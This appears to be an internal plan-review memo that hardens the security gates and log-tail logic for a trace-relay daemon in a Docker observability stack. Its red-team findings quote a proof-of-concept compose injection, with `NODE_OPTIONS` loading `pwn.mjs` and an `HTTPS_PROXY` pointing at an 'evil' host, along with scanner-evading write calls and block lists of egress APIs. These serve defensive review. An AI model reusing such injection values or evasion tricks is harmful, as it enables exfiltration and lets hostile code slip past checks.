# 13r-b — plan-review adjudication (AM1–AM19) — BINDING, amends and WINS over the plan memo

Round-2 output of the mandated plan review (`red-team` + `reviewer`/simplify, both Opus, parallel).
Where this file contradicts `monster-realm-13r-b-plan.md`, **this file wins.** Read both.

Both lenses independently PoC'd the same unbuildable defect (AM1). The reviewer additionally found a
design blocker (AM2) the plan missed entirely.

---

## BLOCKERS FIXED

**AM1 (S1/B2 — both lenses, executed PoC) — the prescribed compose block CANNOT be written.**
`checkModuleLogsMountReadOnly` (`checks/stack-config-checks.mjs:426-433`) counts **any** whole-file
line trimming to `- …replicas…` (without `type:`) as a mount and requires it to end `:ro`. A compose
**`command:` list item** `- --logs-dir=/data/replicas` is such a line → **C5 FAILS**.
§0's probe used a *stub* with no `command:`, so its "everything else CLEAR" verdict does not
generalize. **Resolution:** mount **source** stays byte-identical to Alloy's
(`${MR_SPACETIME_DATA_DIR:-/var/lib/spacetime}/replicas`, `docker-compose.yml:91`); the **container
target** drops the substring: `…/replicas:/data/module-logs:ro`, and `--logs-dir=/data/module-logs`.
**Delete the plan's "byte-identical mount shape" instruction** — it was about the *source*, and as
written it is unbuildable. OBS-45's "same … bind mount" is a claim about the host source.

**AM2 (B1 — reviewer) — cross-poll spans would be SILENTLY LOST.**
`reconstruct()` (`relay/reconstruct.mjs:72`) calls `pairBreadcrumbs` once per invocation and
`pairBreadcrumbs` (`relay/pair.mjs:58`) matches FIFO **within one batch**. A daemon calling
`reconstruct(linesSinceLastPoll, …)` never pairs an `enter` from poll N with its `exit` in poll N+1 —
both land in `unpaired`, which is **count-only** (`reconstruct.mjs:84-98`), so the daemon cannot even
carry them forward. **Resolution (additive, in scope):** `reconstruct` returns the `unpaired` **array**
alongside the existing count; the daemon keeps a **bounded** carry-over of unpaired `enter` crumbs
(explicit max entries **and** max age; eviction emits a diagnostic and **never** a span, per OBS-42).
Both bounds are ADR-0191 decisions. **U16** enter@N / exit@N+1 → exactly one span with the correct
duration; **U17** an evicted enter → diagnostic, never a span. Existing `reconstruct` callers are
unaffected (additive return field) — the batch CLI and the 4 pure suites stay green.

---

## DESIGN CHANGES

**AM3 (S7/M12 — both lenses) — `/health` serves ONE label-free counter, not an empty body.**
Verified live against real `prom/prometheus:v3.13.2`: a real exposition body yields `up=1` identically
to an empty one; `ok` → `up=0`; **`204 No Content` → `up=0`** (the most idiomatic Node "empty body",
and an unnamed landmine in the plan). Serving `mr_trace_relay_lines_read_total` (+ a
`..._last_read_timestamp_seconds`) makes the body a valid exposition doc **by construction**,
removing the whole landmine class at equal code size, and **discharges D8's parked residual** — a
stalled tail becomes visible instead of being a named park. This directly answers R2 (a wrong mount
mode is a *silent* stall that `up` alone cannot catch). **In-scope consequence:**
`HOST_NATIVE_ALLOWLIST` (`eval:207`) gains `'mr_trace_relay_'`, else C15
`checkQueriedSeriesAreDefined` rejects the new series as dangling. **D8's park is DELETED.**

**AM4 (M4) — run as `user: "473:473"`, not `65534:65534`.** Alloy already requires 473 for the same
mount (`docker-compose.yml:74-76`). A second uid forces the operator to widen host-side `r-x` on the
SpacetimeDB data dir to another identity — an entire avoidable precondition, and R2's silent-stall
surface. Zero cost (numeric uid; no passwd entry needed).

**AM5 (M5) — `command:` MUST begin `node /opt/relay/daemon.mjs`.** The `node:*-alpine` entrypoint does
`set -- node "$@"` when `$1` starts with `-`, so a bare `--web.listen-address=…` becomes a **node** CLI
option and the container dies. Full list form; still **no `entrypoint:`**.

**AM6 — the OTLP POST client is DEFERRED** (plan Task 10 decision point, resolved: **skip**).
Justification (reviewer's stronger form): with `$trace_pair_set = ∅` the client's only observable
behavior is POSTing `{"resourceSpans":[]}` on a loop, while adding an HTTP egress surface, a
retry/backoff state machine and a header-allowlist obligation — textbook YAGNI, and the un-defer
trigger is already gated (G9h fires at first membership). **This SIMPLIFIES the hardest gate problem:**
the daemon now has **ZERO egress**, so instead of S3's conditional egress gate we assert a flat ban —
`daemon.mjs` contains none of `fetch(`, `.request(`, `.connect(`, `node:https`, `node:net`, `undici`.
Stronger *and* smaller. Park it as **P5, verbatim, in the G9g idiom** with a live tripwire.

---

## GATE HARDENING (the false-green fixes)

**AM7 (S3 — executed PoC, scanned GREEN) — `WRITE_APIS` is porous.** A cheat daemon writing via
`await open(p,'a').write(doc)` and `cpSync('/logs','/tmp/x',{recursive:true})` passed every proposed
gate: **neither `open(` (only `opensync`) nor `cpsync` is in `WRITE_APIS`** (`eval:1051-1066`).
Add: `open(`, `promises.open`, `cpsync`, `mkdtempsync`, `writesync`, `symlinksync`, `linksync`,
`utimessync`. Also: compensator #1 (`exactly one .listen(`) cannot see a `/debug/eval` backdoor on
that same listener → replace with a **positive route enumeration**: the handler's dispatch key set is
**exactly** `['/health']`.

**AM8 (S9) — THREE ban tiers, not two, + exhaustive classification.**
`daemon.test.mjs` drives *injected* transports and needs **none** of the relaxations, so it keeps all
8 bans (this is what mechanically forces U13's injected seam, and prevents a real listener on a fixed
port under `node --test`'s parallel execution — the recorded global-lock flake class). A filename-keyed
tier map **fails open** for any file in neither tier, and `RELAY_TEST_FILES` is edited by hand →
assert every present `.mjs` resolves to **exactly one** tier, and add an unclassified-file fixture to
T-p. `relay/fixtures/` is **unscanned** (`readdirSync` is non-recursive, `eval:3343-3345`) → walk
recursively or assert the subdir holds no `.mjs`.

**AM9 (S5/S6) — the tail state machine loses and duplicates data; U1–U6 cover none of it.**
Executed attacks that all fail the plan's spec: **A1** inode reuse (`ino42` reused → classified
`growth`, first 4096 bytes of a NEW file dropped, read starts mid-line); **A2** rotation-tail loss
(bytes appended to the old inode between polls live in `*.log.1`, which the `*.log` glob drops —
on EVERY rotation); **A3** copytruncate + fast writer (truncate-to-0 then 5000 bytes → `growth`,
since the truncation branch needs `size < prevOffset`); **A4** double rotation within one poll.
Plus: **partial-line × rotation is untested** — if the line buffer is keyed by path and not cleared on
`rotated`, the held tail of the old file splices onto the new file's first bytes; log content is
module output, i.e. attacker-influenced, so the halves can be crafted into a *valid-looking*
breadcrumb. **This is the highest-value missing test.** Also `truncated → restart at 0` re-emits the
surviving prefix (duplicate spans; no dedup specified), and `prevSize` is a dead state field.
**Resolution:** identity = `{dev, ino, headSample}` (first 64 bytes, read by the **shell** so
`tail.mjs` stays pure) + `birthtimeMs` secondary; a `headSample` mismatch ⇒ `rotated`. Add A1–A4 and
partial-line×rotation as tests. Document rotation-tail loss as a **second stated gap** beside D2's.
**AM9b (S6) — off-by-one:** the decider returns half-open `[readFrom, readTo)`; Node's
`createReadStream` `end` is **INCLUSIVE** → `end: readTo - 1`, plus an adapter test asserting
`bytesRead === readTo - readFrom` (U3 asserts the *decision*, never the adapter). Left unfixed this
duplicates one byte at every chunk boundary → corrupt JSON.

**AM10 (B3/S2/M10) — OBS-45's "the SAME mount" is currently UNGATED, and the relay block is an
unguarded injection surface.** PoC: a relay block with a shell-exfil `entrypoint:`, `env_file:`,
`NODE_OPTIONS=--import=/opt/relay/pwn.mjs`, `NODE_USE_ENV_PROXY=1`,
`HTTPS_PROXY=http://spy:hunter2pass@evil:8080` and `MR_RELAY_KEY=…` passed **C3, C5, C6, C7 and C17**.
`checkNoExecLogSource` is hardcoded to the `alloy` service (`checks/stack-config-checks.mjs:539-570`).
**G9n becomes:** scoped to the relay's `volumes:` sub-block — (1) a mount whose **source half is
string-equal to Alloy's** replicas source, (2) ending `:ro`, (3) `--logs-dir`'s value starts with that
mount's **target**; plus (4) **no `entrypoint:`**, (5) no `SHELL_MARKERS` (`:517`), (6) no `env_file:`,
(7) **no `environment:` key at all**, (8) `command:` flag names are an exact allowlist.

**AM11 (B4/B5/S4) — G9p as specified permits a permanently-green dead-man's switch.** `AlloyDown`
thresholds via an `__expr__` node, not in the expr (`rules.yml:59-69`), so a relay rule with a `gt`
evaluator, `isPaused: true`, a dangling `condition:` refId, or a wrong `datasourceUid` passes G9p and
**never fires**. A new-uid rule with `up{job="alloy"} or up{job="mr-trace-relay"}` also passes while
being one rule for two processes — exactly what spec `:542-547` calls unbuildable.
**G9p must additionally assert:** the `condition:` refId resolves to a threshold node `lt` / `params:
[1]` over the refId carrying the relay expr, **derived from AlloyDown in the same document**;
`isPaused` absent/false; `datasourceUid` equals AlloyDown's; `for:` **equals** AlloyDown's (mirror,
not a lower bound — `for: 24h` passes a `≥` check); the relay group's `interval:` ≤ AlloyDown's; and
the relay expr does **not** contain `job="alloy"`.
**Implementation trap:** in `rules.yml` `for:` **precedes** `expr:` within a rule, so a scan that finds
AlloyDown by its `expr:` then searches *forward* for `for:` picks up **`10m`** from
`AlloyIngestStalled` (`:80`). Split on `- uid:` boundaries and **parse durations to seconds**
(`'60s' < '10m'` string-compares wrong). Fixtures must use *different* `for:` values per rule so a
scan-direction bug is visible.

**AM12 (S10) — G9o scoping.** Resolve `job_name` **inside `scrape_configs:`** (a decoy top-level
`x-parked:` key otherwise satisfies a flat line scan while Prometheus never scrapes it), and resolve
the compose port via `composeServiceBlock(compose,'mr-trace-relay')` — a file-wide
`indexOf('--web.listen-address=')` returns **prometheus's 9090** (`docker-compose.yml:51`, first
occurrence). T-n must include a fixture where the relay port ≠ 9090, else that bug is invisible.
Note C3 is a **name** check only: a structurally complete but hostile block passes it.

---

## BEHAVIOR / HYGIENE

**AM13 (M1) — the daemon must NOT inherit the batch CLI's empty-directory `exit 1`**
(`mr-trace-relay.mjs:146-153`). Under `restart: unless-stopped` an empty/not-yet-created replicas tree
at boot ⇒ crash loop ⇒ `up=0` ⇒ the dead-man's switch pinned firing. Warn once to stderr, keep
polling, `/health` answers 200 throughout. Test it.

**AM14 (M2) — emit a document only when `resourceSpans` is non-empty**; diagnostics on change or at a
coarse interval. Otherwise the daemon prints `{"resourceSpans":[]}` every poll forever into Docker's
json-file driver (no `logging:` limits anywhere in the compose) for zero information.

**AM15 (M3) — SSOT: import, do not re-implement.** Export `collectLogFiles` (`mr-trace-relay.mjs:107`)
and `loadTracePairSet` (`:59`, the 4-stage "absence is NOT the empty set" contract) from the batch CLI
— it is main-guarded at `:170`, so exporting is safe. **Interaction:** the daemon may then contain
neither `readfilesync` nor `readdirsync`, failing the `RELAY_SHELL_FILE` positive-read check
(`eval:3414-3422`) → extend its needle set with `createreadstream`, the daemon's real read API.

**AM16 — CUTS (simplification, no defect-class loss).**
(a) **G9q/T-q deleted** — fold the `0.0.0.0` and `://` needles into G9i's existing per-production-file
loop (`eval:3376-3423`), which already iterates exactly that way; fold the fixtures into T-p.
(b) **No `now` seam** — nothing in the daemon reads wall-clock time (pairing uses the host `ts`;
cadence uses the timer; `/health`'s counter is a monotonic count). Cutting it lets **`date.now(` stay
banned** in every tier — the retier *keeps* a ban instead of relaxing it. Relax exactly ONE of
`setinterval(`/`settimeout(`, and assert "exactly one timer call site".
(c) **L1 cut, L2 kept** — L1 (`GET /health` → 200) is strictly implied by L2 (the target shows
`health: "up"`), and L2 is the criterion-level proof. Avoids duplicating the `MR_OBS_ALLOY_FETCH`
argv-seam parser into a second eval (the repo already carries a ~420-line eval-duplication residual,
`ARCHITECTURE.md:1380`).
(d) **U10 → an accepted-SET assertion** — the parser's accepted flags are **exactly**
`{--logs-dir, --web.listen-address, --trace-pair-set}`; any other flag exits 1. Strictly stronger than
enumerating four credential-ish names, and smaller.

**AM17 — R1 DOWNGRADED to low (empirically booted).**
`docker run --user 65534:65534 --read-only --cap-drop ALL --security-opt no-new-privileges:true
node:24-alpine` served HTTP, `exit=0 restarts=0`, with no tmpfs / no writable /tmp / no HOME.
Holds **only** while the daemon stays dependency-free and never touches `os.tmpdir()`. R2 (host-side
`r-x` for the mount uid) stays high — and AM3's counter is what makes it detectable.

**AM18 (M7) — do NOT rewrite history.** `ADR-0180:923` is a *historical record* of what m20b did,
already superseded by the `:1020` amendment; `ARCHITECTURE.md:1387` **already** reads "parked as
m20e-2, formerly m20b-2". Only ADR-0180 `:1020`'s named forward obligation (the compose/prometheus
**comments**) is ours. `:1032`'s four boot defects were discharged by **ADR-0190/13r-a**, not by this
slice — do not claim them. Append the 13r-b paragraph after `ARCHITECTURE.md:1387`; edit nothing above.

**AM19 (M15) — mirror `labels: severity: critical`** from AlloyDown, or the relay rule silently takes
the catch-all 4h repeat interval instead of 1h (`notification-policies.yml:8-9`).

---

## SCOPE DELTA (all declared under `touches-delta:` in the PR body)

| File | Why it is REQUIRED |
|---|---|
| `checks/stack-config-checks.test.mjs` | **3 lines** (not 2 — M8): `EXPECTED_SERVICE_NAMES` `:57-65`, the title `:1629`, **and** the now-false comment at `:355` ("7 now, 8 in m20b-2"). Mechanical consequence of the 8th service in the declared `docker-compose.yml`. Verified no sibling owns `checks/**`. |
| `ops/observability/README.md` | 5 sites, ~10 mechanical lines — `:18-26` topology diagram, `:29-31` "Seven containers… ships in slice m20b-2", `:144-149` licensing table, **`:151-155` "Deliberately absent: `mr-trace-relay`"**, `:167`. A "Deliberately absent" heading over a *running* container is a false statement about deployed security/topology posture in the file `README.md:37` tells the operator to start from. |
| `docs/observability-dr-runbook.md` | R2's mount-permission precondition (the plan said "document in the runbook" but omitted it from the file list). C18 `checkRunbookHasRunnableSteps` is unaffected. |

`tempo/tempo-config.yml:5` and `datasources.yml:16` are genuinely just stale slice labels →
**flag, do not edit** (follow-up flag in the handoff).

**M14 — verified, none:** the relay reuses `MR_SPACETIME_DATA_DIR`, so `validate.mjs`'s `RENDER_ENV`
(`:27-33`) and `.env.example` need **no** new key. Stated rather than left silent.

---

## ADR-0191 must state plainly (honesty clauses)

1. **As shipped in 13r-b the 8th service answers `/health` with a real counter and prints span
   documents to stdout, which nothing ingests** (OTLP POST deferred, AM6). The reader must not have to
   derive this.
2. `$trace_pair_set` is **∅**, so the emitted document is empty regardless of sink (R7, the original
   m20b objection `ADR-0180:928-935`) — this does **not** block OBS-45/46 but must be said.
3. **The mechanical atomicity proof (reviewer):** `checkListenAddrsLoopback` fails closed
   (`checks/stack-config-checks.mjs:494-499`), so an 8th compose service *structurally cannot exist*
   without a listening process — which is why "ship the mount, defer `/health`" was never available.
   This converts plan §1 from rhetoric into evidence.
4. **The relay is the SECOND service bent to a hardcoded checker list** (`LISTEN_FLAGS`): the first is
   tempo, whose compose keeps a flag it cannot parse (`docker-compose.yml:129-136`) solely to keep the
   predicate green. `--web.listen-address` is chosen on **Prometheus-ecosystem convention** grounds
   (the relay *is* a scrape target) with checker-compat as a consequence, not the reverse. The right
   follow-up is per-service binding sources (already prescribed at `eval:97-107`), not a 6th literal.
5. AM9's two stated gaps (D2 EOF-start; rotation-tail loss) and AM2's carry-over bounds.
